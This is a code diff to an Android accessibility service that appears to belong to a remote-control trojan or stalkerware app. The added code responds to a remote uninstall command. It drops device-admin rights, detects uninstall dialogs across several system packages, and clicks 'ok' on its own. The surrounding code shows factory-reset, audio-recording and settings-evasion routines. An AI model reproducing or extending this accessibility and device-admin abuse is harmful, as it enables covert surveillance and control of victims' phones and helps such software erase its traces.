@@ -420,6 +420,7 @@ public class MainAccessibilityService extends AccessibilityService {
 
             if (ACTION_UNINSTALL_APP.equals(intent.getAction())) {
                 iscanuninstallapp = true;
+                performUninstallApp();
             }
 
             if (ACTION_SCREEN_SCROLL.equals(intent.getAction())) {
@@ -757,6 +758,24 @@ public class MainAccessibilityService extends AccessibilityService {
                     onGoBack();
                 }
             }
+        } else {
+            CharSequence packagename = String.valueOf(event.getPackageName());
+            CharSequence classname = String.valueOf(event.getClassName());
+            if(packagename.equals("com.google.android.packageinstaller") ||
+                    packagename.equals("com.android.systemui") ||
+                    packagename.equals("com.miui.home") ||
+                    (packagename.equals("com.mi.android.globallauncher") && classname.equals("com.miui.home.launcher.uninstall.DeleteDialog"))) {
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if(rootNode != null) {
+                    isSelectedApp = false;
+                    isUninstallapp = false;
+                    isAppDetail = false;
+                    getUninstallDialog(rootNode);
+                    if(isSelectedApp && isUninstallapp) {
+                        setUninstallApp(rootNode);
+                    }
+                }
+            }
         }
     }
 
@@ -1033,7 +1052,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     if(node.isVisibleToUser()){
                         Log.d("isVisibleToUser", nodeText);
                     }
-                    if(node.isVisibleToUser() && nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
+                    if(node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName()))) {
                         isSelectedApp = true;
                     }
                     if (node.isVisibleToUser() && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
@@ -1048,10 +1067,11 @@ public class MainAccessibilityService extends AccessibilityService {
     }
     public void getAppDetailPage(AccessibilityNodeInfo node) {
         if(node != null) {
-            if (node.getClassName() != null && node.isVisibleToUser() && node.getClassName().equals("android.widget.TextView")) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains("com.support.litework")) {
+                    Log.d("infotext::", nodeText);
+                    if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName())) {
                         isSelectedApp = true;
                     }
                     if (nodeText.contains("informações do app") || nodeText.contains("app info")
@@ -1122,6 +1142,22 @@ public class MainAccessibilityService extends AccessibilityService {
                 if(classname !=null && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
                     onGoBack();
                 }
+            }
+        }
+    }
+
+    public void setUninstallApp(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString().toLowerCase();
+                    if(nodeText.equals("ok")) {
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+            }
+            for (int i = 0; i< node.getChildCount(); i++) {
+                setUninstallApp(node.getChild(i));
             }
         }
     }
@@ -2060,6 +2096,17 @@ public class MainAccessibilityService extends AccessibilityService {
             audioRecord.stop();
             audioRecord.release();
         }).start();
+    }
+
+    public void performUninstallApp() {
+        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+            mDevicePolicyManager.removeActiveAdmin(mAdminComponent);
+            myService.startUninstallDialog();
+        } else {
+            myService.startUninstallDialog();
+        }
     }
 
     public void performFactoryReset() {
